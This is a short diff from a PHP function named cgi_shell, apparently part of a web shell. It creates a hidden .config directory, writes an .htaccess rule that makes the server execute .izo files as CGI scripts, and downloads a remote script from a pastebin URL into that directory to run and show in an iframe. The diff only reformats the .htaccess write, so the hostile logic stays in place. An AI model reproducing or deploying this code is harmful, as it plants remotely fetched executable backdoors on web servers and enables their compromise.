@@ -706,9 +706,7 @@ function cgi_shell()
 	if(!file_exists('.config')) {
 		mkdir('.config');
 	}
-	$isi  = "AddHandler cgi-script .izo
-	Options -Indexes";
-	file_put_contents('.config/.htaccess', $isi);
+	file_put_contents('.config/.htaccess', "AddHandler cgi-script .izo\nOptions -Indexes");
 	file_put_contents('.config/cgi.izo', file_get_contents('https://pastebin.com/raw/MUD0EPjb'));
 	echo("<iframe src='.config/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>");
 	die();
